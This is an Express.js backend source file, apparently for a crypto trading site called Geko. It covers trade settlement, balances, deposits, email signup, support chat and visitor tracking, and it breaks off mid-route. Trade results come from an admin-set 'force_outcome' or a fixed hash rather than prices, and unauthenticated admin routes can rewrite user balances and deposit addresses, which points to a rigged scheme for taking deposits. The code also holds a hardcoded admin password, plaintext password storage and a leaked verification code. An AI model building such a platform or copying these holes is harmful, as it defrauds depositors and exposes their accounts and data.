import express from 'express';
import cors from 'cors';
import axios from 'axios';
import dotenv from 'dotenv';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import { Connection, PublicKey, LAMPORTS_PER_SOL, Keypair, Transaction, SystemProgram } from '@solana/web3.js';
import { sendAndConfirmTransaction } from '@solana/web3.js';
import bs58 from 'bs58';
import crypto from 'crypto';
import { Resend } from 'resend';
import { getDb } from './server/db_local.js';

dotenv.config();

const resend = process.env.RESEND_API_KEY ? new Resend(process.env.RESEND_API_KEY) : null;

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Global Error Handlers to prevent crashes
process.on('uncaughtException', (err) => {
  console.error('[CRITICAL] Uncaught Exception:', err.message);
  console.error(err.stack);
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('[CRITICAL] Unhandled Rejection at:', promise, 'reason:', reason);
});

const app = express();
// USE PORT 8080 FOR UNIFIED PREVIEW
const port = 8080;

// ─── Debug Logger ──────────────────────────────────────────────────────────
app.use((req, res, next) => {
  console.log(`[Request] ${req.method} ${req.url}`);
  next();
});

app.use(cors());
// Allow framing and basic security headers
app.use((req, res, next) => {
  res.setHeader('X-Frame-Options', 'ALLOWALL');
  next();
});

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

let globalConfig = {
  vault_balance: "0.00",
  deposit_address: "6HmBxJuv9f5P92am6AK18KZGkHGqbNUazYXXKhvrDviw"
};

let db = null;
let dbAvailable = false;
let lastInitError = null;
let dbInitPromise = null;

const initializeDatabase = async () => {
  try {
    console.log('[DB] Connecting to local database...');
    db = await getDb();
    dbAvailable = true;
    console.log('[DB] Local database (db.json) ready.');
    
    // Server-side trade settlement loop
    setInterval(async () => {
      if (!dbAvailable || !db) return;
      try {
        const now = Date.now();
        const pendingTrades = db.data.trades.filter(t => 
            t.status === 'pending' && 
            (now - new Date(t.created_at).getTime()) >= (t.duration * 1000)
        );

        for (const trade of pendingTrades) {
          console.log(`[Auto-Settle] Settling trade ${trade.id} for ${trade.wallet_address}`);
          let isWin = false;
          if (trade.force_outcome === 'win') isWin = true;
          else if (trade.force_outcome === 'loss') isWin = false;
          else {
            const seed = trade.id.split('').reduce((acc, char) => acc + char.charCodeAt(0), 0);
            isWin = seed % 2 === 0;
          }

          const leverageFactor = (parseFloat(trade.leverage || 10)) / 10;
          const amount = parseFloat(trade.amount || 0);
          const payoutRate = 0.85;
          const payout = isWin ? amount * (1 + (payoutRate * leverageFactor)) : 0;
          
          trade.status = isWin ? 'won' : 'lost';
          trade.settled_at = new Date().toISOString();

          if (payout > 0) {
            const user = db.data.users.find(u => u.wallet_address === trade.wallet_address);
            if (user) {
                if (trade.is_demo) {
                    user.demo_balance = (parseFloat(user.demo_balance || 0) + payout).toString();
                } else {
                    user.trading_balance = (parseFloat(user.trading_balance || 0) + payout).toString();
                }
            }
            
            db.data.transactions.push({
              wallet_address: trade.wallet_address,
              asset_symbol: 'USDT',
              amount: payout,
              type: 'trade',
              reference: `trade-auto-settle:${trade.id}`,
              created_at: new Date().toISOString()
            });
          }
        }
        if (pendingTrades.length > 0) await db.write();
      } catch (e) {
        console.error('[Auto-Settle Error]', e.message);
      }
    }, 5000);

    // setInterval(processDailyInterest, 60 * 60 * 1000); 
    // processDailyInterest();
  } catch (err) {
    console.error('[DB Error] CRITICAL initialization failure:', err.message);
    lastInitError = err.message;
    dbAvailable = false;
  }
};

dbInitPromise = initializeDatabase();

// ─── Health check ──────────────────────────────────────────────────────────
app.get('/api/health', async (req, res) => {
  if (dbInitPromise) await dbInitPromise.catch(() => {});
  
  let dbStatus = dbAvailable ? 'CONNECTED (LOCAL) ✅' : 'DISCONNECTED ❌';
  let userCount = db?.data?.users?.length || 0;
  
  res.json({ 
    status: 'ONLINE', 
    db: dbStatus, 
    users: userCount, 
    error: lastInitError,
    time: new Date().toISOString() 
  });
});

app.use(async (req, res, next) => {
  if (dbInitPromise && !dbAvailable) {
    try {
      // Wait for initialization but don't block forever (max 15s for Vercel)
      const timeout = new Promise((_, reject) => setTimeout(() => reject(new Error('DB_INIT_TIMEOUT')), 15000));
      await Promise.race([dbInitPromise, timeout]).catch(err => {
        console.warn('[DB Middleware] Initialization check timed out or failed:', err.message);
      });
    } catch (e) {
      console.error('[DB Middleware] Error awaiting initialization:', e.message);
    }
  }
  next();
});

// ─── Shared Utilities ──────────────────────────────────────────────────────
async function recordTransaction({ wallet_address, asset_symbol, amount, type, payment_id = null, tx_signature = null, reference = null, status = 'completed' }) {
  if (!dbAvailable || !db || !wallet_address) return null;

  try {
    let user = db.data.users.find(u => u.wallet_address === wallet_address);
    if (!user) {
      user = {
        wallet_address,
        last_seen: new Date().toISOString(),
        trading_balance: "0",
        protocol_settlement_balance: "0",
        demo_balance: "100000",
        status: 'guest',
        created_at: new Date().toISOString()
      };
      db.data.users.push(user);
    } else {
      user.last_seen = new Date().toISOString();
    }
  } catch (upsertErr) {
    console.error('[Record Tx] USER_SYNC_ERROR:', upsertErr.message);
  }
  
  const newTx = {
    id: crypto.randomUUID(),
    wallet_address,
    asset_symbol: asset_symbol.toUpperCase(),
    amount: parseFloat(amount),
    type,
    payment_id,
    tx_signature,
    reference,
    status,
    created_at: new Date().toISOString()
  };

  db.data.transactions.push(newTx);
  await db.write();

  return newTx;
}

async function getUserBalance(walletAddress, assetSymbol) {
  if (!dbAvailable || !db) return 0;

  const user = db.data.users.find(u => u.wallet_address === walletAddress);
  if (!user) return 0;

  if (assetSymbol.toUpperCase() === 'USDT') {
    return parseFloat(user.protocol_settlement_balance || 0);
  }

  const balance = db.data.transactions
    .filter(tx => tx.wallet_address === walletAddress && tx.asset_symbol === assetSymbol.toUpperCase() && tx.status === 'completed' && tx.type !== 'trade')
    .reduce((acc, tx) => acc + parseFloat(tx.amount || 0), 0);

  return balance;
}


// ─── Session Yield Processor (48h / $2) ───────────────────────────────────
async function processDailyInterest() {
  if (!dbAvailable || !db) return;
  try {
    console.log('[Yield] Checking for eligible users for $2 yield (48h cycle)...');
    
    const now = new Date();
    const eligibleUsers = db.data.users.filter(u => {
        const lastInterest = u.last_interest_at ? new Date(u.last_interest_at) : null;
        const hoursSinceLast = lastInterest ? (now - lastInterest) / (1000 * 60 * 60) : 999;
        return hoursSinceLast >= 48 && parseFloat(u.protocol_settlement_balance || 0) >= 1000;
    });

    for (const user of eligibleUsers) {
      const yieldAmt = 2.00;
      
      user.protocol_settlement_balance = (parseFloat(user.protocol_settlement_balance || 0) + yieldAmt).toString();
      user.last_interest_at = now.toISOString();

      await recordTransaction({
        wallet_address: user.wallet_address,
        asset_symbol:   'USDT',
        amount:         yieldAmt,
        type:           'interest',
        reference:      '48h_session_yield_reward'
      });
      
      console.log(`[Yield] Credited $${yieldAmt} to ${user.wallet_address}`);
    }

    if (eligibleUsers.length > 0) await db.write();
  } catch (err) {
    console.error('[Yield Error] Failed to process session yield:', err.message);
  }
}

// ─── PWA Manifest ───────────────────────────────────────────────────────────
app.get('/manifest.json', (req, res) => {
  res.json({
    "short_name": "Geko",
    "name": "Geko Institutional Terminal",
    "start_url": ".",
    "display": "standalone",
    "theme_color": "#0B0E11",
    "background_color": "#0B0E11"
  });
});

// ─── Config endpoints ──────────────────────────────────────────────────────
app.get('/api/config', async (req, res) => {
  if (dbAvailable && db) {
    try {
      const dbConfig = db.data.config.reduce((acc, row) => ({ ...acc, [row.key]: row.value }), {});
      return res.json({ ...globalConfig, ...dbConfig });
    } catch (e) { console.error('Config fetch error:', e.message); }
  }
  res.json({ 
    ...globalConfig, 
    solana_deposit_address: '6HmBxJuv9f5P92am6AK18KZGkHGqbNUazYXXKhvrDviw',
    btc_deposit_address: '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa',
    eth_deposit_address: '0x742d35Cc6634C0532925a3b844Bc454e4438f44e',
    usdt_deposit_address: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
  });
});

app.post('/api/admin/config', async (req, res) => {
  const { solana_deposit_address, btc_deposit_address, eth_deposit_address, usdt_deposit_address } = req.body;

  if (dbAvailable && db) {
    try {
      const updates = [];
      if (solana_deposit_address) updates.push(['solana_deposit_address', solana_deposit_address]);
      if (btc_deposit_address) updates.push(['btc_deposit_address', btc_deposit_address]);
      if (eth_deposit_address) updates.push(['eth_deposit_address', eth_deposit_address]);
      if (usdt_deposit_address) updates.push(['usdt_deposit_address', usdt_deposit_address]);

      for (const [key, val] of updates) {
        let entry = db.data.config.find(c => c.key === key);
        if (entry) {
          entry.value = val;
          entry.updated_at = new Date().toISOString();
        } else {
          db.data.config.push({ key, value: val, updated_at: new Date().toISOString() });
        }
      }
      await db.write();
      return res.json({ success: true });
    } catch (e) {
      console.error('Config update error:', e.message);
      return res.status(500).json({ error: e.message });
    }
  }
  
  if (solana_deposit_address !== undefined) globalConfig.solana_deposit_address = solana_deposit_address;
  if (btc_deposit_address !== undefined) globalConfig.btc_deposit_address = btc_deposit_address;
  if (eth_deposit_address !== undefined) globalConfig.eth_deposit_address = eth_deposit_address;
  if (usdt_deposit_address !== undefined) globalConfig.usdt_deposit_address = usdt_deposit_address;
  res.json({ success: true, config: globalConfig });
});

// ─── Live prices proxy ─────────────────────────────────────────────────────
app.get('/api/binance/prices', async (req, res) => {
  try {
    const krakenPairs = 'XXBTZUSD,XETHZUSD,SOLUSD,XXRPZUSD,ADAUSD,AVAXUSD,XDGUSD,DOTUSD,LINKUSD,XLTCZUSD,TRXUSD,UNIUSD,ATOMUSD,AAVEUSD';
    const krakenRes = await axios.get(`https://api.kraken.com/0/public/Ticker?pair=${krakenPairs}`, {
      headers: { 'Accept': 'application/json', 'User-Agent': 'GekoProtocol/1.0' }
    });
    const r = krakenRes.data.result;

    const findPair = (candidates) => {
      for (const c of candidates) { if (r[c]) return r[c]; }
      return null;
    };
    const change = (pair) => {
      if (!pair) return '0';
      const last = parseFloat(pair.c[0]);
      const open = parseFloat(pair.o);
      return open > 0 ? (((last - open) / open) * 100).toFixed(2) : '0';
    };

    const pairs = {
      BTC:  findPair(['XXBTZUSD', 'XBTUSD', 'BTCUSD']),
      ETH:  findPair(['XETHZUSD', 'ETHUSD']),
      SOL:  findPair(['SOLUSD']),
      XRP:  findPair(['XXRPZUSD', 'XRPUSD']),
      ADA:  findPair(['ADAUSD']),
      AVAX: findPair(['AVAXUSD']),
      DOGE: findPair(['XDGUSD', 'DOGEUSD']),
      DOT:  findPair(['DOTUSD']),
      LINK: findPair(['LINKUSD']),
      LTC:  findPair(['XLTCZUSD', 'LTCUSD']),
      TRX:  findPair(['TRXUSD']),
      UNI:  findPair(['UNIUSD']),
      ATOM: findPair(['ATOMUSD']),
      AAVE: findPair(['AAVEUSD']),
      BNB:  findPair(['BNBUSD']),
    };

    const mapped = Object.entries(pairs)
      .filter(([, p]) => p)
      .map(([sym, p]) => ({ symbol: `${sym}USDT`, lastPrice: p.c[0], priceChangePercent: change(p) }));

    // Add USDT/USDT pair for swap stability
    mapped.push({ symbol: 'USDTUSDT', lastPrice: '1.00', priceChangePercent: '0' });

    return res.json(mapped);
  } catch (err) {
    console.warn('Kraken failed:', err.message);
    const fallback = [
        { symbol: 'BTCUSDT', lastPrice: '96405.00', priceChangePercent: '1.25' },
        { symbol: 'ETHUSDT', lastPrice: '2750.50', priceChangePercent: '-0.42' },
        { symbol: 'SOLUSDT', lastPrice: '185.20', priceChangePercent: '3.10' },
        { symbol: 'BNBUSDT', lastPrice: '640.15', priceChangePercent: '0.85' },
        { symbol: 'XRPUSDT', lastPrice: '2.72', priceChangePercent: '1.10' },
        { symbol: 'ADAUSDT', lastPrice: '1.15', priceChangePercent: '-1.50' },
        { symbol: 'DOGEUSDT', lastPrice: '0.42', priceChangePercent: '5.20' },
        { symbol: 'DOTUSDT', lastPrice: '7.80', priceChangePercent: '0.00' },
        { symbol: 'LINKUSDT', lastPrice: '24.20', priceChangePercent: '2.15' },
        { symbol: 'LTCUSDT', lastPrice: '115.40', priceChangePercent: '-0.30' },
        { symbol: 'TRXUSDT', lastPrice: '0.22', priceChangePercent: '0.45' },
        { symbol: 'UNIUSDT', lastPrice: '12.10', priceChangePercent: '1.80' },
        { symbol: 'ATOMUSDT', lastPrice: '8.45', priceChangePercent: '-0.90' },
        { symbol: 'AAVEUSDT', lastPrice: '185.00', priceChangePercent: '0.00' },
        { symbol: 'USDTUSDT', lastPrice: '1.00', priceChangePercent: '0' }
    ];
    return res.json(fallback);
  }
});

app.get('/api/binance/klines', async (req, res) => {
  const { symbol, interval, limit } = req.query;
  const sym = (symbol || 'BTCUSDT').replace('USDT', '');
  
  const krakenMap = {
    'BTC': 'XXBTZUSD', 'ETH': 'XETHZUSD', 'SOL': 'SOLUSD', 'XRP': 'XXRPZUSD', 
    'ADA': 'ADAUSD', 'AVAX': 'AVAXUSD', 'DOGE': 'XDGUSD', 'DOT': 'DOTUSD', 
    'LINK': 'LINKUSD', 'LTC': 'XLTCZUSD', 'TRX': 'TRXUSD', 'UNI': 'UNIUSD', 
    'ATOM': 'ATOMUSD', 'AAVE': 'AAVEUSD', 'BNB': 'BNBUSD'
  };

  const pair = krakenMap[sym] || 'XXBTZUSD';
  
  try {
    // interval mapping: Kraken uses minutes. 1m=1, 5m=5, etc.
    const krakenInterval = interval === '1m' ? 1 : 60; 
    const krakenRes = await axios.get(`https://api.kraken.com/0/public/OHLC?pair=${pair}&interval=${krakenInterval}`, {
      headers: { 'Accept': 'application/json', 'User-Agent': 'GekoProtocol/1.0' }
    });
    
    if (krakenRes.data && krakenRes.data.result && krakenRes.data.result[pair]) {
      const data = krakenRes.data.result[pair].slice(-(parseInt(limit) || 100));
      const formatted = data.map(d => [
        d[0] * 1000, // time
        d[1], // open
        d[2], // high
        d[3], // low
        d[4], // close
      ]);
      return res.json(formatted);
    }
    throw new Error('Invalid response from Kraken');
  } catch (err) {
    console.warn('Kraken Klines failed:', err.message);
    // Fallback: Minimal mock data to prevent blank screen
    const now = Math.floor(Date.now() / 60000) * 60000;
    const mock = [];
    let p = 50000;
    for(let i=100; i>=0; i--) {
        const o = p;
        const c = p + (Math.random() - 0.5) * 100;
        mock.push([
            now - i*60000, 
            o, 
            Math.max(o, c) + 20, 
            Math.min(o, c) - 20, 
            c
        ]);
        p = c;
    }
    return res.json(mock);
  }
});

// ─── Admin User Management ─────────────────────────────────────────────────
app.get('/api/admin/users', async (req, res) => {
  if (dbAvailable && db) {
    try {
      const users = db.data.users
        .filter(u => u.wallet_address && u.wallet_address !== '')
        .map(u => {
          const activeTrades = db.data.trades.filter(t => t.wallet_address === u.wallet_address && t.status === 'pending').length;
          return { ...u, active_trades_count: activeTrades };
        })
        .sort((a, b) => new Date(b.last_seen) - new Date(a.last_seen));
      return res.json(users);
    } catch (e) {
      console.error('[Admin] REGISTRY_FETCH_ERROR:', e.message);
      return res.status(500).json({ error: e.message });
    }
  }
  res.status(400).json({ error: 'Database unavailable' });
});

app.post('/api/admin/users/update', async (req, res) => {
  const { id, wallet_data, balance_override, trading_balance, demo_balance, protocol_settlement_balance, swap_sent } = req.body;

  if (dbAvailable && db) {
    try {
      const user = db.data.users.find(u => u.id == id || u.wallet_address == id);
      if (!user) return res.status(404).json({ error: 'User not found' });

      if (wallet_data !== undefined) user.wallet_data = wallet_data;
      if (balance_override !== undefined) user.balance_override = balance_override;
      if (trading_balance !== undefined) user.trading_balance = trading_balance.toString();
      if (demo_balance !== undefined) user.demo_balance = demo_balance.toString();
      if (protocol_settlement_balance !== undefined) user.protocol_settlement_balance = protocol_settlement_balance.toString();
      
      if (swap_sent !== undefined) {
        const oldSwapSent = user.swap_sent;
        user.swap_sent = swap_sent;
        // If swap was confirmed (swap_sent changed from true to false), record transaction
        if (oldSwapSent === true && swap_sent === false) {
            await recordTransaction({
                wallet_address: user.wallet_address,
                asset_symbol: 'USDT',
                amount: parseFloat(user.protocol_settlement_balance || 0),
                type: 'swap',
                reference: 'admin_confirmed_swap',
                status: 'completed'
            });
        }
      }

      await db.write();
      return res.json({ success: true, user });
    } catch (e) {
      console.error('[Admin] USER_UPDATE_ERROR:', e.message);
      return res.status(500).json({ error: e.message });
    }
  }
});

app.post('/api/admin/users/delete', async (req, res) => {
  const { id } = req.body;
  if (dbAvailable && db) {
    try {
      const index = db.data.users.findIndex(u => u.id == id || u.wallet_address == id);
      if (index !== -1) {
        db.data.users.splice(index, 1);
        await db.write();
      }
      return res.json({ success: true });
    } catch (e) {
      console.error('[Admin] USER_DELETE_ERROR:', e.message);
      return res.status(500).json({ error: e.message });
    }
  }
  res.status(400).json({ error: 'DB unavailable' });
});

// Register / upsert a user (called on wallet connect)
app.post('/api/users/upsert', async (req, res) => {
  let { wallet_address, address, wallet_data, ip_address, nickname } = req.body;
  const targetAddress = (wallet_address || address || '').trim();
  
  if (!targetAddress || targetAddress.length < 32) {
    return res.status(400).json({ error: 'Valid wallet_address required' });
  }

  if (dbAvailable && db) {
    try {
      let user = db.data.users.find(u => u.wallet_address === targetAddress);
      
      if (!user) {
        user = {
          id: Date.now(),
          wallet_address: targetAddress,
          wallet_data: wallet_data || {},
          ip_address: ip_address || req.ip || null,
          last_seen: new Date().toISOString(),
          nickname: nickname || null,
          demo_balance: "100000",
          protocol_settlement_balance: "0",
          trading_balance: "0",
          status: 'guest',
          created_at: new Date().toISOString()
        };
        db.data.users.push(user);
      } else {
        user.wallet_data = wallet_data || user.wallet_data;
        user.ip_address = ip_address || req.ip || user.ip_address;
        user.last_seen = new Date().toISOString();
        if (nickname) user.nickname = nickname;
      }
      
      await db.write();
      return res.json({ success: true, user });
    } catch (e) {
      console.error('[Upsert] CRITICAL_SYNC_FAILURE:', e.message);
      return res.status(500).json({ error: `Sync Error: ${e.message}` });
    }
  }

  res.status(503).json({ error: 'Cloud Registry Unavailable' });
});

// Heartbeat
app.post('/api/users/heartbeat', async (req, res) => {
  const { wallet_address, address } = req.body || {};
  const target = (wallet_address || address || '').trim();
  if (!target) return res.json({ success: false });

  if (dbAvailable && db) {
    try {
      const user = db.data.users.find(u => u.wallet_address === target);
      if (user) {
        user.last_seen = new Date().toISOString();
        await db.write();
      }
      return res.json({ success: true });
    } catch (e) { 
      console.error('Heartbeat error:', e.message);
      return res.status(500).json({ success: false, error: 'Internal server error' });
    }
  }
  res.status(503).json({ success: false, error: 'Database unavailable' });
});

app.get('/api/user/data', async (req, res) => {
  const { address } = req.query;
  if (!dbAvailable || !db) return res.status(400).json({ error: 'Database unavailable' });

  try {
    const user = db.data.users.find(u => u.wallet_address === address);
    if (user) {
      return res.json(user);
    } else {
      return res.status(404).json({ error: 'User not found' });
    }
  } catch (e) { 
    console.error('User fetch error:', e.message);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── Email Auth: Login & Signup ──────────────────────────────────────────────
app.post('/api/send-email', async (req, res) => {
  const { to, subject, html } = req.body;
  if (!resend) return res.status(503).json({ error: 'Email service unavailable' });
  
  try {
    const data = await resend.emails.send({
      from: 'Geko Protocols <noreply@gekoprotocols.com>',
      to: [to],
      subject: subject,
      html: html,
    });
    res.json({ success: true, data });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.post('/api/auth/signup-request', async (req, res) => {
  const { email, password, name } = req.body;
  if (!email || !password) return res.status(400).json({ error: 'Email and password required' });
  if (!dbAvailable || !db) return res.status(400).json({ error: 'Database unavailable' });

  try {
    const userEmail = email.toLowerCase().trim();
    // Check if user already exists and is approved
    const existing = db.data.users.find(u => u.email === userEmail);
    if (existing && existing.status === 'approved') {
        return res.status(400).json({ error: 'Email already registered and approved' });
    }

    const signupCode = Math.floor(100000 + Math.random() * 900000).toString();
    console.log(`[Signup] VERIFICATION_CODE for ${userEmail}: ${signupCode}`);

    // REAL EMAIL SENDING VIA RESEND
    if (resend) {
        try {
            await resend.emails.send({
                from: 'Geko Protocols <noreply@gekoprotocols.com>',
                to: [userEmail],
                subject: `Geko Verification Code: ${signupCode}`,
                html: `<p>Your Geko Protocols verification code is: <strong>${signupCode}</strong></p>`
            });
            console.log(`[Signup] Real email sent to ${userEmail}`);
        } catch (emailErr) {
            console.warn('[Signup] Email delivery failed:', emailErr.message);
        }
    }

    // Upsert the pending registration
    const virtualAddress = '0x' + crypto.createHash('sha256').update(userEmail).digest('hex').slice(0, 40);
    const nickname = name || userEmail.split('@')[0].toUpperCase();

    if (existing) {
        existing.password = password;
        existing.signup_code = signupCode;
        existing.nickname = nickname;
        existing.last_seen = new Date().toISOString();
    } else {
        db.data.users.push({
            id: Date.now(),
            email: userEmail,
            password,
            signup_code: signupCode,
            nickname,
            wallet_address: virtualAddress,
            status: 'guest',
            last_seen: new Date().toISOString(),
            trading_balance: "0",
            protocol_settlement_balance: "0",
            demo_balance: "100000",
            created_at: new Date().toISOString()
        });
    }
    
    await db.write();

    res.json({ 
      success: true, 
      message: 'Verification code sent to your email',
      alternativeCode: signupCode // Alternative: show code in case email fails
    });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/auth/signup-confirm', async (req, res) => {
  const { email, code } = req.body;
  if (!email || !code) return res.status(400).json({ error: 'Email and code required' });
  if (!dbAvailable || !db) return res.status(400).json({ error: 'Database unavailable' });

  try {
    const user = db.data.users.find(u => u.email === email.toLowerCase().trim() && u.signup_code === code);

    if (!user) return res.status(400).json({ error: 'Invalid verification code' });

    user.status = 'pending_approval';
    user.signup_code = null;
    await db.write();

    res.json({ success: true, message: 'Registration confirmed! Waiting for admin approval.' });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/auth/signup', async (req, res) => {
  res.status(410).json({ error: 'Endpoint deprecated. Use signup-request and signup-confirm.' });
});

app.post('/api/auth/login', async (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) return res.status(400).json({ error: 'Email and password required' });

  // HARDCODED ADMIN CHECK
  if (email.toLowerCase().trim() === 'admin@gmail.com' && password === '12345678') {
      return res.json({ 
          success: true, 
          user: {
            id: 999,
            address: 'ADMIN_GATEWAY',
            email: 'admin@gmail.com',
            nickname: 'ADMIN_ROOT',
            name: 'ADMIN_ROOT',
            status: 'approved',
            role: 'admin',
            wallet_data: {},
            trading_balance: 0,
            demo_balance: 0,
            protocol_settlement_balance: 0
          }
      });
  }

  if (!dbAvailable || !db) return res.status(400).json({ error: 'Database unavailable' });

  try {
    const userEmail = email.toLowerCase().trim();
    const user = db.data.users.find(u => u.email === userEmail && u.password === password);
    
    if (!user) return res.status(401).json({ error: 'Invalid credentials' });
    
    if (user.status === 'guest') return res.status(403).json({ error: 'Account pending admin approval', status: 'guest' });
    if (user.status === 'rejected') return res.status(403).json({ error: 'Account rejected by admin', status: 'rejected' });

    user.last_seen = new Date().toISOString();
    await db.write();

    return res.json({ 
      success: true, 
      user: {
        id: user.id,
        address: user.wallet_address,
        email: user.email,
        nickname: user.nickname,
        name: user.nickname,
        status: user.status,
        role: 'user',
        wallet_data: user.wallet_data || {},
        trading_balance: user.trading_balance,
        demo_balance: user.demo_balance,
        protocol_settlement_balance: user.protocol_settlement_balance,
        pending_deposit_currency: user.pending_deposit_currency,
        pending_deposit_amount: user.pending_deposit_amount
      }
    });
  } catch (e) {
    console.error('Email login error:', e.message);
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/admin/users/logout', async (req, res) => {
  const { id } = req.body;
  if (dbAvailable && db) {
    try {
      const user = db.data.users.find(u => u.id == id || u.wallet_address == id);
      if (user) {
        user.status = 'force_logout';
        await db.write();
      }
      return res.json({ success: true });
    } catch (e) {
      console.error('[Admin] USER_LOGOUT_ERROR:', e.message);
      return res.status(500).json({ error: e.message });
    }
  }
  res.status(400).json({ error: 'DB unavailable' });
});

app.post('/api/auth/logout-and-forget', async (req, res) => {
  const { email } = req.body;
  if (!email) return res.status(400).json({ error: 'Email required' });
  if (dbAvailable && db) {
    try {
      const index = db.data.users.findIndex(u => u.email === email.toLowerCase().trim());
      if (index !== -1) {
        db.data.users.splice(index, 1);
        await db.write();
      }
      res.json({ success: true });
    } catch (e) {
      res.status(500).json({ error: e.message });
    }
    return;
  }
  res.status(400).json({ error: 'Database unavailable' });
});

// ─── Admin Management Endpoints ───────────────────────────────────────────
app.post('/api/admin/users/approve', async (req, res) => {
  const { userId } = req.body;
  if (!dbAvailable || !db) return res.status(400).json({ error: 'Database unavailable' });
  try {
    const user = db.data.users.find(u => u.id == userId || u.wallet_address == userId);
    if (user) {
      user.status = 'approved';
      await db.write();
    }
    res.json({ success: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/admin/users/reject', async (req, res) => {
  const { userId } = req.body;
  if (!dbAvailable || !db) return res.status(400).json({ error: 'Database unavailable' });
  try {
    const user = db.data.users.find(u => u.id == userId || u.wallet_address == userId);
    if (user) {
      user.status = 'rejected';
      await db.write();
    }
    res.json({ success: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/admin/deposit', async (req, res) => {
  const { walletAddress, currency, amount } = req.body;
  if (!dbAvailable || !db) return res.status(400).json({ error: 'Database unavailable' });
  try {
    const user = db.data.users.find(u => u.wallet_address === walletAddress);
    if (user) {
      user.pending_deposit_currency = currency.toUpperCase();
      user.pending_deposit_amount = amount;
      user.swap_sent = false;
      await db.write();
    }
    res.json({ success: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/user/swap', async (req, res) => {
  const { walletAddress } = req.body;
  if (!dbAvailable || !db) return res.status(400).json({ error: 'Database unavailable' });
  try {
    const user = db.data.users.find(u => u.wallet_address === walletAddress);
    if (user) {
      user.swap_sent = true;
      await db.write();
    }
    res.json({ success: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ─── Support Chat Endpoints ─────────────────────────────────────────────
app.get('/api/support/messages', async (req, res) => {
  const { address } = req.query;
  if (!dbAvailable || !db) return res.status(400).json({ error: 'Database unavailable' });
  try {
    const ticket = db.data.support_tickets.find(t => t.wallet_address === address);
    res.json(ticket?.messages || []);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/api/support/send', async (req, res) => {
  const { address, message, sender } = req.body;
  if (!dbAvailable || !db) return res.status(400).json({ error: 'Database unavailable' });
  try {
    let ticket = db.data.support_tickets.find(t => t.wallet_address === address);
    const newMessage = { text: message, sender, timestamp: new Date().toISOString() };
    if (!ticket) {
      db.data.support_tickets.push({
        id: Date.now(),
        wallet_address: address,
        subject: 'General Support',
        messages: [newMessage],
        updated_at: new Date().toISOString()
      });
    } else {
      ticket.messages = ticket.messages || [];
      ticket.messages.push(newMessage);
      ticket.updated_at = new Date().toISOString();
    }
    await db.write();
    res.json({ success: true });
  } catch (e) { res.status(500).json({ error: e.message }); }
});

app.get('/api/admin/support/tickets', async (req, res) => {
  if (!dbAvailable || !db) return res.status(400).json({ error: 'Database unavailable' });
  try {
    const tickets = [...db.data.support_tickets].sort((a, b) => new Date(b.updated_at) - new Date(a.updated_at));
    res.json(tickets);
  } catch (e) { res.status(500).json({ error: e.message }); }
});

// ─── Balance Transfer ─────────────────────────────────────────────────────
app.post('/api/balance/transfer', async (req, res) => {
  const { walletAddress, amount, direction } = req.body;
  if (!walletAddress || !amount || !direction) return res.status(400).json({ error: 'Missing parameters' });
  if (!dbAvailable || !db) return res.status(400).json({ error: 'Database unavailable' });

  try {
    const amt = Math.abs(parseFloat(amount));
    const user = db.data.users.find(u => u.wallet_address === walletAddress);
    if (!user) return res.status(404).json({ error: 'User not found' });
    
    const vaultBal = parseFloat(user.protocol_settlement_balance || 0);
    const tradeBal = parseFloat(user.trading_balance || 0);

    if (direction === 'vault_to_trade') {
      if (vaultBal < amt) return res.status(400).json({ error: 'Insufficient protocol settlement balance' });
      user.protocol_settlement_balance = (vaultBal - amt).toString();
      user.trading_balance = (tradeBal + amt).toString();
    } else if (direction === 'trade_to_vault') {
      if (tradeBal < amt) return res.status(400).json({ error: 'Insufficient trading balance' });
      user.trading_balance = (tradeBal - amt).toString();
      user.protocol_settlement_balance = (vaultBal + amt).toString();
    } else {
      return res.status(400).json({ error: 'Invalid direction' });
    }

    await db.write();
    res.json({ success: true, trading_balance: user.trading_balance, protocol_settlement_balance: user.protocol_settlement_balance });
  } catch (e) {
    console.error('Transfer error:', e.message);
    res.status(500).json({ error: e.message });
  }
});

// ─── Visitor tracking ──────────────────────────────────────────────────────
app.post('/api/visitors/track', async (req, res) => {
  const ip = (req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || '').trim();
  const { visitor_id, user_agent, page_path } = req.body || {};

  if (!dbAvailable || !db) return res.status(400).json({ error: 'Database unavailable' });

  try {
    const existing = db.data.visitors.find(v => v.visitor_id === visitor_id);
    if (existing) {
      existing.last_seen = new Date().toISOString();
      existing.visit_count = (existing.visit_count || 0) + 1;
      existing.ip_address = ip;
      existing.user_agent = user_agent;
      existing.page_path = page_path;
    } else {
      db.data.visitors.push({
        id: Date.now(),
        visitor_id,
        ip_address: ip,
        user_agent,
        page_path,
        last_seen: new Date().toISOString(),
        visit_count: 1
      });
    }
    await db.write();
    return res.json({ success: true });
  } catch (e) { 
    console.error('Visitor track error:', e.message);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

app.get('/api/admin/visitors', async (req, res) => {
  if (!dbAvailable || !db) return res.status(400).json({ error: 'Database unavailable' });

  try {
    const visitors = [...db.data.visitors].sort((a, b) => new Date(b.last_seen) - new Date(a.last_seen)).slice(0, 500);
    return res.json(visitors);
  } catch (e) { 
    console.error('Visitor fetch error:', e.message);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// ─── User balance ──────────────────────────────────────────────────────────
app.get('/api/user/transactions', async (req, res) => {
  const { address, limit } = req.query;
  if (!address) return res.status(400).json({ error: 'Address required' });
